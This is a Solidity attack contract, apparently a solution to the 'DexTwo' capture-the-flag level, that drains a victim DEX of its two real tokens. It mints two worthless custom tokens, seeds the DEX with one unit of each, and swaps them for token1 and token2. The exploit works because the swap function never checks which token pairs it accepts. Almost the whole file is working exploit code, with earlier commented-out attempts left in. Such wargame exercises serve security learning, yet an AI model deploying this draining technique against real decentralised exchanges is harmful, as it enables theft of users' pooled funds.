//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import '@openzeppelin/contracts/utils/math/SafeMath.sol';
import './DexTwo.sol';

contract DexTwoAttack {
    DexTwo public dexVictim;
    address public playerAddr;
    address public token1;
    address public token2;
    /*
    MyCustomToken public token3;
    MyCustomToken public token4;
    */
    SwappableTokenTwo public token3;
    SwappableTokenTwo public token4;

    constructor(address _dexAddr, address _playerAddr, address _token1, address _token2 ){
        /*
        token3 = new MyCustomToken(_dexAddr,"My Token 3","MYTKN3",1);
        token4= new MyCustomToken(_dexAddr,"My Token 4","MYTKN4",1);
        */
        token3 = new SwappableTokenTwo(_dexAddr,"My Token 3","MYTKN3",100);
        token4= new SwappableTokenTwo(_dexAddr,"My Token 4","MYTKN4",100);

        dexVictim = DexTwo(_dexAddr);
        
        playerAddr = _playerAddr;
        token1= _token1;
        token2= _token2;

        ERC20(token3).transfer(_dexAddr, 1);
        ERC20(token4).transfer(_dexAddr, 1);        

    }

    function approveMyThirdTransfers()public {
        dexVictim.approve(playerAddr, 2**256 - 1);
        token3.approve(address(dexVictim), 2**256 - 1);
        token4.approve(address(dexVictim), 2**256 - 1);
    }

    function drainToken1(uint _amount)public {
        /*
        dexVictim.swap(token1,address(token3), dexVictim.balanceOf(token1,playerAddr) );
        dexVictim.swap(address(token3),token1,  dexVictim.balanceOf(address(token3),playerAddr) );
        dexVictim.swap(token1,address(token3), dexVictim.balanceOf(token1,playerAddr) );
        dexVictim.swap(address(token3),token1,  dexVictim.balanceOf(address(token3),playerAddr) );
        dexVictim.swap(token1,address(token3), dexVictim.balanceOf(token1,playerAddr) );
        dexVictim.swap(address(token3),token1,  45 );*/
        //dexVictim.swap(address(token3),token1,  100 );        
        dexVictim.swap(address(token3),token1,  _amount );        
    }

    function drainToken2(uint _amount)public {
        /*
        dexVictim.swap(token2,address(token4), dexVictim.balanceOf(token2,playerAddr) );
        dexVictim.swap(address(token4),token2,  dexVictim.balanceOf(address(token4),playerAddr) );
        dexVictim.swap(token2,address(token4), dexVictim.balanceOf(token2,playerAddr) );
        dexVictim.swap(address(token4),token2,  dexVictim.balanceOf(address(token4),playerAddr) );
        dexVictim.swap(token2,address(token4), dexVictim.balanceOf(token2,playerAddr) );
        dexVictim.swap(address(token4),token2,  45 );*/
        //dexVictim.swap(address(token4),token2,  100 );
        dexVictim.swap(address(token4),token2,  _amount );
    }

    function getBalanceOfToken1() public view returns (uint){
        return dexVictim.balanceOf(token1,address(dexVictim));
    }
    function getBalanceOfToken2() public view returns (uint){
        return dexVictim.balanceOf(token2,address(dexVictim));
    }
    function getBalanceOfToken3() public view returns (uint){
        return dexVictim.balanceOf(address(token3),address(dexVictim));
    }
    function getBalanceOfToken4() public view returns (uint){
        return dexVictim.balanceOf(address(token4),address(dexVictim));
    }    
    function getSwapToken1Price(uint _amount) public view returns (uint){
        return dexVictim.getSwapAmount(address(token3), address(token1), _amount);
    }    
    function getSwapToken2Price(uint _amount) public view returns (uint){
        return dexVictim.getSwapAmount(address(token4), address(token2), _amount);
    }    
}


/*
contract MyCustomToken is ERC20 {
  address private _dex;
  constructor(address dexInstance, string memory name, string memory symbol, uint initialSupply) public ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _mint(_dex, initialSupply);
        _dex = dexInstance;
  }

  function approve(address owner, address spender, uint256 amount) public returns(bool){
    require(owner != _dex, "InvalidApprover");
    super._approve(owner, spender, amount);
  }
}
*/